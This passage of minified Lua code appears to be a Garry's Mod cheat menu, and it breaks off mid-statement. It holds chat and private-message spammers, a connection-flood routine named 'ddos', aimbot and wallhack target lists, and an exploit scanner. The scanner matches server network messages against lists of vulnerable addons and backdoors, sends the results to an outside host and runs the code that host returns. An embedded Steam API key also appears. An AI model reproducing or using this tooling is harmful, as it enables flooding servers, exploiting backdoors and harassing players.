al=vgui.Create("DFrame")al:SetPos(100,100)al:SetSize(500,293)al:SetDraggable(true)al:MakePopup()al:ShowCloseButton(false)al:SetTitle("")al.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))draw.SimpleText("Spam","hack_font_18",5,2.5,Color(120,120,120))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)end;local ad=3;local function ae(a2,F,q)local am=vgui.Create("DButton",al)am:SetFont("hack_font_18")am:SetText(F)am:SetTextColor(Color(255,255,255))am:SetSize(a2,25)am:SetPos(ad,25)am.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,am:GetSize())if U[F]then draw.RoundedBox(0,0,0,N,P,Color(150,150,150,100))elseif am.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;am.DoClick=q;ad=ad+a2+2 end;ae(41,"Chat",function()if IsValid(panelcspam)then panelcspam:Remove()end;panelcspam=vgui.Create("DScrollPanel",al)panelcspam:SetPos(3,52)panelcspam:SetSize(494,238)panelcspam.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,panelcspam:GetSize())end;local function an()if IsValid(menumessage)then menumessage:Remove()end;menumessage=vgui.Create("DScrollPanel",panelcspam)menumessage:SetPos(3,25+5)menumessage:SetSize(280+40+2,205)menumessage.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,menumessage:GetSize())end;local ao=3;for b=1,#U.chat do local am=vgui.Create("DButton",menumessage)am:SetFont("hack_font_18")am:SetText(U.chat[b])am:SetTextColor(Color(255,255,255))am:SetSize(select(1,surface.GetTextSize(U.chat[b]))+20,25)am:SetPos(3,ao)am.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,am:GetSize())if am.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;am.DoClick=function()table.remove(U.chat,b)an()end;ao=ao+27 end end;local ap=vgui.Create("DTextEntry",panelcspam)ap:SetPos(3,3)ap:SetSize(280,25)ap:SetText("text")ap.Paint=function(self,N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;local am=vgui.Create("DButton",panelcspam)am:SetFont("hack_font_18")am:SetText("Add")am:SetTextColor(Color(255,255,255))am:SetSize(40,25)am:SetPos(280+5,3)am.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,am:GetSize())if am.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;am.DoClick=function()U.chat[#U.chat+1]=ap:GetText()an()end;local aq=panelcspam:Add("DCheckBoxLabel")aq:SetPos(330-3,2)aq:SetText("Enabled")aq:SetFont("hack_font_18")aq:SetTextColor(Color(255,255,255))if U["chatspam"]then aq:SetValue(true)else aq:SetValue(false)end;function aq:OnChange(ar)if ar then U["chatspam"]=true else U["chatspam"]=false end end;function aq.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;local aq=panelcspam:Add("DCheckBoxLabel")aq:SetPos(330-3,2+18)aq:SetText("OOC")aq:SetFont("hack_font_18")aq:SetTextColor(Color(255,255,255))if U["chatspamooc"]then aq:SetValue(true)else aq:SetValue(false)end;function aq:OnChange(ar)if ar then U["chatspamooc"]=true else U["chatspamooc"]=false end end;function aq.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;local aq=panelcspam:Add("DCheckBoxLabel")aq:SetPos(330-3,2+18+18)aq:SetText("Super OOC")aq:SetFont("hack_font_18")aq:SetTextColor(Color(255,255,255))if U["chatspamoocsuper"]then aq:SetValue(true)else aq:SetValue(false)end;function aq:OnChange(ar)if ar then U["chatspamoocsuper"]=true else U["chatspamoocsuper"]=false end end;function aq.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;local aq=panelcspam:Add("DCheckBoxLabel")aq:SetPos(330-3,2+18+18+18)aq:SetText("Pm")aq:SetFont("hack_font_18")aq:SetTextColor(Color(255,255,255))if U["chatpmspammer"]then aq:SetValue(true)else aq:SetValue(false)end;function aq:OnChange(ar)if ar then U["chatpmspammer"]=true;file.Write(k.runlua,[[ local chat_strings=util.JSONToTable(']]..util.TableToJSON(U.chat)..[[') timer.Create("32912",0.1,0,function() if rp then rp.RunCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) end RunConsoleCommand("pm",table.Random(player.GetAll()):SteamID(),chat_strings[math.random(#chat_strings)]) LocalPlayer():ConCommand("darkrp pm "..table.Random(player.GetAll()):Name().." "..chat_strings[math.random(#chat_strings)]) end) ]])else U["chatpmspammer"]=false;file.Write(k.runlua,[[timer.Remove("32912")]])end end;function aq.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;an()end)ae(67,"Connect",function()if IsValid(panelcspam)then panelcspam:Remove()end;panelcspam=vgui.Create("DScrollPanel",al)panelcspam:SetPos(3,52)panelcspam:SetSize(494,238)panelcspam.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,panelcspam:GetSize())end;local function an()if IsValid(menumessage)then menumessage:Remove()end;menumessage=vgui.Create("DScrollPanel",panelcspam)menumessage:SetPos(3,25+5)menumessage:SetSize(280+40+2,205)menumessage.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,menumessage:GetSize())end;local ao=3;for b=1,#U.connect do local am=vgui.Create("DButton",menumessage)am:SetFont("hack_font_18")am:SetText(U.connect[b])am:SetTextColor(Color(255,255,255))am:SetSize(200,25)am:SetPos(3,ao)am.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,am:GetSize())if am.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;am.DoClick=function()table.remove(U.connect,b)an()end;ao=ao+27 end end;local ap=vgui.Create("DTextEntry",panelcspam)ap:SetPos(3,3)ap:SetSize(280,25)ap:SetText("https://execccc.online/hacka")ap.Paint=function(self,N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;local am=vgui.Create("DButton",panelcspam)am:SetFont("hack_font_18")am:SetText("Add")am:SetTextColor(Color(255,255,255))am:SetSize(40,25)am:SetPos(280+5,3)am.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,am:GetSize())if am.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;am.DoClick=function()U.connect[#U.connect+1]=ap:GetText()an()end;local e=vgui.Create("DTextEntry",panelcspam)e:SetSize(150,25)e:SetPos(280+5+40+2,30)e:SetText("ip")local au=vgui.Create("DTextEntry",panelcspam)au:SetSize(45,25)au:SetPos(280+5+40+2+47,3)au:SetText("20")local am=vgui.Create("DButton",panelcspam)am:SetFont("hack_font_18")am:SetText("Start")am:SetTextColor(Color(255,255,255))am:SetSize(45,25)am:SetPos(280+5+40+2,3)am.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,am:GetSize())if am.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;am.DoClick=function()local av=tonumber(au:GetText())local aw=e:GetText()timer.Create("ddos",1,av,function()SetName(U.connect[math.random(1,#U.connect)])RunGameUICommand('engine connect '..aw)timer.Simple(0.5,function()RunGameUICommand('engine disconnect')RunConsoleCommand('disconnect')end)end)end;an()end)timer.Create("ddos",0.1,0,function()if U["chatspam"]then if U.chat=={}then return end;if not U["chatspamooc"]then RunConsoleCommand("say",U.chat[math.random(1,#U.chat)])else RunConsoleCommand("say","/ooc "..U.chat[math.random(1,#U.chat)])end end;if U["chatspamoocsuper"]then if U.chat=={}then return end;RunConsoleCommand("darkrp","ooc "..U.chat[math.random(1,#U.chat)])end end)al:Hide()local ax=vgui.Create("DFrame")ax:SetSize(230,300)ax:Center()ax:SetTitle("")ax:SetDraggable(true)ax:MakePopup()ax:ShowCloseButton(false)ax:SetSizable(true)ax.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))draw.SimpleText("Exploits","hack_font_18",5,2.5,Color(120,120,120))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)end;ax.PerformLayout=function(self,w,x)if IsValid(k.exploitslist)then k.exploitslist:SetSize(w-6,x-54)end end;V("Refresh",3,24,63,ax,function()if IsInGame()then file.Write(k.runlua,[[local a={"pplay_addrow","pplay_sendtable","WriteQuery","SendMoney","BailOut","customprinter_get","textstickers_entdata","NC_GetNameChange","ATS_WARP_REMOVE_CLIENT","ATS_WARP_FROM_CLIENT","ATS_WARP_VIEWOWNER","CFRemoveGame","CFJoinGame","CFEndGame","CreateCase","rprotect_terminal_settings","StackGhost","RevivePlayer","ARMORY_RetrieveWeapon","TransferReport","SimplicityAC_aysent","pac_to_contraption","SyncPrinterButtons76561198056171650","sendtable","steamid2","Kun_SellDrug","net_PSUnBoxServer","pplay_deleterow","pplay_addrow","CraftSomething","banleaver","75_plus_win","ATMDepositMoney","Taxi_Add","Kun_SellOil","SellMinerals","TakeBetMoney","PoliceJoin","CpForm_Answers","DepositMoney","MDE_RemoveStuff_C2S","NET_SS_DoBuyTakeoff","NET_EcSetTax","RP_Accept_Fine","RP_Fine_Player","RXCAR_Shop_Store_C2S","RXCAR_SellINVCar_C2S","drugseffect_remove","drugs_money","CRAFTINGMOD_SHOP","drugs_ignite","drugseffect_hpremove","DarkRP_Kun_ForceSpawn","drugs_text","NLRKick","RecKickAFKer","GMBG:PickupItem","DL_Answering","data_check","plyWarning","NLR.ActionPlayer","timebombDefuse","start_wd_emp","kart_sell","FarmingmodSellItems","ClickerAddToPoints","bodyman_model_change","TOW_PayTheFine","FIRE_CreateFireTruck","hitcomplete","hhh_request","DaHit","TCBBuyAmmo","DataSend","gBan.BanBuffer","fp_as_doorHandler","Upgrade","TowTruck_CreateTowTruck","TOW_SubmitWarning","duelrequestguiYes","JoinOrg","pac_submit","NDES_SelectedEmblem","join_disconnect","Morpheus.StaffTracker","casinokit_chipexchange","BuyKey","BuyCrate","FactionInviteConsole","FacCreate","1942_Fuhrer_SubmitCandidacy","pogcp_report_submitReport","textscreens_download","hsend","BuilderXToggleKill","Chatbox_PlayerChat","reports.submit","services_accept","Warn_CreateWarn","NewReport","soez","GiveHealthNPC","DarkRP_SS_Gamble","buyinghealth","DarkRP_preferredjobmodel","whk_setart","WithdrewBMoney","DuelMessageReturn","ban_rdm","BuyCar","ats_send_toServer","dLogsGetCommand","disguise","gportal_rpname_change","AbilityUse","ClickerAddToPoints","race_accept","give_me_weapon","FinishContract","NLR_SPAWN","Kun_ZiptieStruggle","JB_Votekick","Letthisdudeout","ckit_roul_bet","pac.net.TouchFlexes.ClientNotify","ply_pick_shit","TFA_Attachment_RequestAll","BuyFirstTovar","BuySecondTovar","GiveHealthNPC","MONEY_SYSTEM_GetWeapons","MCon_Demote_ToServer","withdrawp","PCAdd","ActivatePC","PCDelAll","viv_hl2rp_disp_message","ATM_DepositMoney_C2S","BM2.Command.SellBitcoins","BM2.Command.Eject","tickbooksendfine","egg","RHC_jail_player","PlayerUseItem","Chess Top10","ItemStoreUse","EZS_PlayerTag","simfphys_gasspill","sphys_dupe","sw_gokart","wordenns","SyncPrinterButtons16690","AttemptSellCar","uPLYWarning","atlaschat.rqclrcfg","dlib.getinfo.replicate","SetPermaKnife","EnterpriseWithdraw","SBP_addtime","NetData","CW20_PRESET_LOAD","minigun_drones_switch","NET_AM_MakePotion","bitcoins_request_turn_off","bitcoins_request_turn_on","bitcoins_request_withdraw","PermwepsNPCSellWeapon","ncpstoredoact","DuelRequestClient","BeginSpin","tickbookpayfine","fg_printer_money","IGS.GetPaymentURL","pp_info_send","AirDrops_StartPlacement","SlotsRemoved","FARMINGMOD_DROPITEM","cab_sendmessage","cab_cd_testdrive","blueatm","SCP-294Sv","dronesrewrite_controldr","desktopPrinter_Withdraw","RemoveTag","IDInv_RequestBank","UseMedkit","WipeMask","SwapFilter","RemoveMask","DeployMask","ZED_SpawnCar","levelup_useperk","passmayorexam","Selldatride","ORG_VaultDonate","ORG_NewOrg","ScannerMenu","misswd_accept","D3A_Message","LawsToServer","Shop_buy","D3A_CreateOrg","Gb_gasstation_BuyGas","Gb_gasstation_BuyJerrycan","MineServer","AcceptBailOffer","LawyerOfferBail","buy_bundle","AskPickupItemInv","donatorshop_itemtobuy","netOrgVoteInvite_Server","Chess ClientWager","AcceptRequest","deposit","CubeRiot CaptureZone Update","NPCShop_BuyItem","SpawnProtection","hoverboardpurchase","soundArrestCommit","LotteryMenu","updateLaws","TMC_NET_FirePlayer","thiefnpc","TMC_NET_MakePlayerWanted","SyncRemoveAction","HV_AmmoBuy","NET_CR_TakeStoredMoney","nox_addpremadepunishment","GrabMoney","LAWYER.GetBailOut","LAWYER.BailFelonOut","br_send_pm","GET_Admin_MSGS","OPEN_ADMIN_CHAT","LB_AddBan","redirectMsg","RDMReason_Explain","JB_SelectWarden","JB_GiveCubics","SendSteamID","wyozimc_playply","SpecDM_SendLoadout","sv_saveweapons","DL_StartReport","DL_ReportPlayer","DL_AskLogsList","DailyLoginClaim","GiveWeapon","GovStation_SpawnVehicle","inviteToOrganization","createFaction","sellitem","giveArrestReason","unarrestPerson","JoinFirstSS","bringNfreeze","start_wd_hack","DestroyTable","nCTieUpStart","IveBeenRDMed","FIGHTCLUB_StartFight","FIGHTCLUB_KickPlayer","ReSpawn","CP_Test_Results","AcceptBailOffer","IS_SubmitSID_C2S","IS_GetReward_C2S","ChangeOrgName","DisbandOrganization","CreateOrganization","newTerritory","InviteMember","sendDuelInfo","DoDealerDeliver","PurchaseWeed","guncraft_removeWorkbench","wordenns","userAcceptPrestige","vj_npcspawner_sv_create","DuelMessageReturn","Client_To_Server_OpenEditor","GiveSCP294Cup","GiveArmor100","SprintSpeedset","ArmorButton","HealButton","SRequest","ClickerForceSave","rpi_trade_end","NET_BailPlayer","vj_testentity_runtextsd","vj_fireplace_turnon2","requestmoneyforvk","gPrinters.sendID","FIRE_RemoveFireTruck","drugs_effect","drugs_give","NET_DoPrinterAction","opr_withdraw","money_clicker_withdraw","NGII_TakeMoney","gPrinters.retrieveMoney","revival_revive_accept","chname","NewRPNameSQL","UpdateRPUModelSQL","SetTableTarget","SquadGiveWeapon","BuyUpgradesStuff","REPAdminChangeLVL","SendMail","DemotePlayer","OpenGates","VehicleUnderglow","Hopping_Test","CREATE_REPORT","CreateEntity","FiremanLeave","DarkRP_Defib_ForceSpawn","Resupply","BTTTStartVotekick","_nonDBVMVote","REPPurchase","deathrag_takeitem","FacCreate","InformPlayer","lockpick_sound","SetPlayerModel","changeToPhysgun","VoteBanNO","VoteKickNO","shopguild_buyitem","MG2.Request.GangRankings","RequestMAPSize","gMining.sellMineral","ItemStoreDrop","optarrest","TalkIconChat","UpdateAdvBoneSettings","ViralsScoreboardAdmin","PowerRoundsForcePR","showDisguiseHUD","withdrawMoney","SyncPrinterButtons76561198027292625","phone","STLoanToServer","TCBDealerStore","TCBDealerSpawn","ts_buytitle","gMining.registerAchievement","gPrinters.openUpgrades"}local b={"Sbox_gm_attackofnullday_key","c","enablevac","ULXQUERY2","Im_SOCool","MoonMan","LickMeOut","SessionBackdoor","OdiumBackDoor","ULX_QUERY2","Sbox_itemstore","Sbox_darkrp","Sbox_Message","_blacksmurf","nostrip","Remove_Exploiters","Sandbox_ArmDupe","rconadmin","jesuslebg","disablebackdoor","blacksmurfBackdoor","jeveuttonrconleul","lag_ping","memeDoor","DarkRP_AdminWeapons","Fix_Keypads","noclipcloakaesp_chat_text","_CAC_ReadMemory","Ulib_Message","Ulogs_Infos","ITEM","nocheat","I?psilon","JQerystrip.disable","Sandbox_GayParty","DarkRP_UTF8","PlayerKilledLogged","OldNetReadData","Backdoor","cucked","NoNerks","kek","DarkRP_Money_System","BetStrep","ZimbaBackdoor","something","random","strip0","fellosnake","idk","||||","EnigmaIsthere","ALTERED_CARB0N","killserver","fuckserver","cvaraccess","_Defcon","dontforget","aze46aez67z67z64dcv4bt","nolag","changename","music","_Defqon","xenoexistscl","R8","AnalCavity","DefqonBackdoor","fourhead","echangeinfo","PlayerItemPickUp","thefrenchenculer","elfamosabackdoormdr","stoppk","noprop","reaper","Abcdefgh","JSQuery.Data(Post(false))","pjHabrp9EY","_Raze","88","Dominos","NoOdium_ReadPing","m9k_explosionradius","gag","_cac_","_Battleye_Meme_","legrandguzmanestla","ULogs_B","arivia","_Warns","xuy","samosatracking57","striphelper","m9k_explosive","GaySploitBackdoor","_GaySploit","slua","Bilboard.adverts:Spawn(false)","BOOST_FPS","FPP_AntiStrip","ULX_QUERY_TEST2","FADMIN_ANTICRASH","ULX_ANTI_BACKDOOR","UKT_MOMOS","rcivluz","SENDTEST","MJkQswHqfZ","INJ3v4","_clientcvars","_main","GMOD_NETDBG","thereaper","audisquad_lua","anticrash","ZernaxBackdoor","bdsm","waoz","stream","adm_network","antiexploit","ReadPing","berettabest","componenttolua","theberettabcd","negativedlebest","mathislebg","SparksLeBg","DOGE","FPSBOOST","N::B::P","PDA_DRM_REQUEST_CONTENT","shix","Inj3","AidsTacos","verifiopd","pwn_wake","pwn_http_answer","pwn_http_send","The_Dankwoo","PRDW_GET","fancyscoreboard_leave","DarkRP_Gamemodes","DarkRP_Armors","yohsambresicianatik<3","EnigmaProject","PlayerCheck","Ulx_Error_88","FAdmin_Notification_Receiver","DarkRP_ReceiveData","Weapon_88","__G____CAC","AbSoluT","mecthack","SetPlayerDeathCount","awarn_remove","fijiconn","nw.readstream","LuaCmd","The_DankWhy"}local c=0;local d=0;local e={}for f=1,10000 do local g=util.NetworkIDToString(f)if not g then break end;if table.HasValue(b,g)then c=c+1;table.insert(e,g.." "..f)if d<=c then d=c end elseif table.HasValue(a,g)then table.insert(e,g)c=c+1 else if d<3 then e={}end;c=0 end end;local h=""local i=0;for j=0,65536 do local k=util.NetworkIDToString(j)if k and k~=""then if not net.Receivers[k]then h=h..k;if table.HasValue(a,k)then i=i+1 end end end end;if i>15 then for l,m in SortedPairs(net.Receivers)do file.Append("]]..k.exploits..[[",l)end else file.Write("]]..k.exploits..[[",h)end if _G.Props_3 or _G.PropWhiteList then file.Append("]]..k.exploits..[[","spawnopropbypass")end]])end;timer.Simple(1,function()if IsValid(k.exploitslist)then k.exploitslist:Remove()end;k.exploitslist=vgui.Create("DScrollPanel",ax)k.exploitslist:SetPos(3,24+25+2)k.exploitslist:SetSize(230-6,246)k.exploitslist.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,k.exploitslist:GetSize())end;k.exploitslist.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;k.exploitslist.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;k.exploitslist.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local ay=3;function addexploits(F,az,aA,type)local a9=vgui.Create("DButton",k.exploitslist)a9:SetFont("hack_font_18")a9:SetText(F)a9:SetTextColor(Color(255,255,255))a9:SetSize(select(1,surface.GetTextSize(F))+20,25)a9:SetPos(3,ay)a9.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(35,35,35,255))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a9:GetSize())if a9.Hovered then draw.RoundedBox(0,0,0,N,P,Color(120,120,120,100))end end;a9:SetToolTip(aA)if type==nil then a9.DoClick=function()if IsInGame()then file.Write(k.runlua,az)end end else a9.DoClick=az end;ay=ay+27 end;if IsInGame()then k.httppost("https://execccc.online/hacka/account/exploit.php",{user=username,pass=password,dmdkg=file.Read(k.exploits,"DATA")},RunStringEx)end end)end)ax:Hide()local aB=vgui.Create("DFrame")aB:SetSize(600,350)aB:Center()aB:SetTitle("")aB:SetDraggable(true)aB:MakePopup()aB:ShowCloseButton(false)aB.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30))draw.RoundedBox(0,0,0,N,22,Color(71,74,79))draw.RoundedBox(0,0,22,N,1,Color(0,0,0))draw.SimpleText("Target","hack_font_18",5,2.5,Color(120,120,120))surface.SetDrawColor(Color(0,0,0))surface.DrawOutlinedRect(0,0,N,P)surface.SetDrawColor(Color(50,50,50))surface.DrawOutlinedRect(1,23,N-2,P-24)end;V("Disable all",517,25,80,aB,function()p("WH_ENTITYLIST","")p("AIM_ENTITYLIST","")p("AIMBOT_FRIEND","")p("MISC_SPECTATE_TARGET","")p("AIMBOT_TEAMS","")p("AIMBOT_RANKS","")end)local aC=vgui.Create("DTextEntry",aB)aC:SetPos(3,53)aC:SetSize(594,25)aC:SetText("")aC.Paint=function(self,N,P)surface.SetDrawColor(25,25,25)surface.DrawRect(0,0,self:GetWide(),self:GetTall())self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;aC.OnTextChanged=function()if IsValid(panelentityall)then findentityxd(aC:GetValue())end end;local ad=3;local function ae(a2,F,q)V(F,ad,25,a2,aB,q)ad=ad+a2+2 end;ae(49,"Entity",function()if IsInGame()then file.Write(k.runlua,'local a={}for b,c in pairs(ents.GetAll())do if not a[c:GetClass()]and IsEntity(c)then a[c:GetClass()]={a=c.PrintName}end end file.Write("'..k.allentity..'",util.TableToJSON(a))')end;timer.Simple(1,function()function findentityxd(aD)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",aB)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,panelentityall:GetSize())end;panelentityall.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local aE=1;local function aF(m,aG,aH)if string.find(m,aD)then local aI=vgui.Create("DButton",panelentityall)aI:SetSize(297,25)aI:SetPos(1,aE)aI:SetText('')aI.Paint=function(x,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30,255))if aH==1 then draw.SimpleText("[NOT SPAWNED] "..m,"hack_font_18",2.5,2,Color(255,255,255))elseif aG["a"]then draw.SimpleText(m.." ("..aG["a"]..")","hack_font_18",2.5,2,Color(255,255,255))else draw.SimpleText(m,"hack_font_18",2.5,2,Color(255,255,255))end end;local aJ=panelentityall:Add("DCheckBoxLabel")aJ:SetPos(300,aE+5)aJ:SetText("Show")aJ:SetFont("hack_font_18")aJ:SetTextColor(Color(255,255,255))if string.find(n["WH_ENTITYLIST"],m)then aJ:SetValue(true)else aJ:SetValue(false)end;function aJ:OnChange(ar)if ar then p("WH_ENTITYLIST",n["WH_ENTITYLIST"]..m)else p("WH_ENTITYLIST",string.Replace(n["WH_ENTITYLIST"],m,""))end end;function aJ.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;local aJ=panelentityall:Add("DCheckBoxLabel")aJ:SetPos(450,aE+5)aJ:SetText("Aiming")aJ:SetFont("hack_font_18")aJ:SetTextColor(Color(255,255,255))if string.find(n["AIM_ENTITYLIST"],m)then aJ:SetValue(true)else aJ:SetValue(false)end;function aJ:OnChange(ar)if ar then p("AIM_ENTITYLIST",n["AIM_ENTITYLIST"]..m)else p("AIM_ENTITYLIST",string.Replace(n["AIM_ENTITYLIST"],m,""))end end;function aJ.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;aE=aE+25 end end;local aK={}local aL=util.JSONToTable(file.Read(k.allentity,"DATA")or'[]')for m,aG in pairs(aL)do aF(m,aG)aK[m]=true end;for m,aG in pairs(D)do if not aK[m]then aF(m,nil,1)end end end;findentityxd("")end)end)ae(53,"Player",function()if IsInGame()then file.Write(k.runlua,[[local a={}for b,c in pairs(player.GetHumans())do a[c:Nick()]={steamid=c:SteamID64(),id=c:UserID()}end;file.Write("]]..k.aimbotfriend..[[",util.TableToJSON(a))]])end;timer.Simple(1,function()function findentityxd(aD)if IsValid(panelentityall)then panelentityall:Remove()end;panelentityall=vgui.Create("DScrollPanel",aB)panelentityall:SetPos(3,53+27)panelentityall:SetSize(600-6,267)panelentityall.Paint=function(f,N,P)surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,panelentityall:GetSize())end;panelentityall.VBar.Paint=function(ag,N,P)draw.RoundedBox(0,0,0,N,P,Color(0,0,0,50))end;panelentityall.VBar.btnUp.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255,255))end;panelentityall.VBar.btnDown.Paint=function(ag,N,P)draw.RoundedBox(0,2,2,N-4,P-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255,255))end;local aE=1;for aM,aN in pairs(util.JSONToTable(file.Read(k.aimbotfriend,"DATA")or'[]'))do if string.find(aM,aD)then local aI=vgui.Create("DButton",panelentityall)aI:SetSize(297,25)aI:SetPos(1,aE)aI:SetText('')aI.Paint=function(f,N,P)draw.RoundedBox(0,0,0,N,P,Color(30,30,30,255))draw.SimpleText(aM,"hack_font_18",2.5,2,Color(255,255,255))end;aI.DoClick=function()local aO=DermaMenu()aO:AddOption("Check on family sharing",function()http.Fetch("https://api.steampowered.com/IPlayerService/IsPlayingSharedGame/v0001/?key=5DCF81C641ACAE4B5E5332A5E04B5FCD&format=json&steamid="..aN["steamid"].."&appid_playing=4000",function(t)local aP=util.JSONToTable(t)["response"]["lender_steamid"]if aP=="0"then local aO=DermaMenu()aO:AddOption("Not found family",function()end)aO:Open()return end;gui.OpenURL("https://steamcommunity.com/profiles/"..aP)end)end)aO:AddOption("Open profile",function()gui.OpenURL("https://steamcommunity.com/profiles/"..aN["steamid"])end)aO:AddOption("Copy SteamID64",function()SetClipboardText(aN["steamid"])end)aO:Open()end;local aJ=panelentityall:Add("DCheckBoxLabel")aJ:SetPos(300,aE+5)aJ:SetText("Friend")aJ:SetFont("hack_font_18")aJ:SetTextColor(Color(255,255,255))if string.find(n["AIMBOT_FRIEND"],aN["steamid"]or"")then aJ:SetValue(true)else aJ:SetValue(false)end;function aJ:OnChange(ar)if ar then p("AIMBOT_FRIEND",n["AIMBOT_FRIEND"]..aN["steamid"])else p("AIMBOT_FRIEND",string.Replace(n["AIMBOT_FRIEND"],aN["steamid"],""))end end;function aJ.Button:Paint(as,at)surface.SetDrawColor(30,30,30)surface.DrawRect(0,0,as,at)if self:GetChecked()then surface.SetDrawColor(Color(100,100,255))surface.DrawRect(0,0,as,at)end;surface.SetDrawColor(Color(100,100,100,255))surface.DrawOutlinedRect(0,0,as,at)end;local 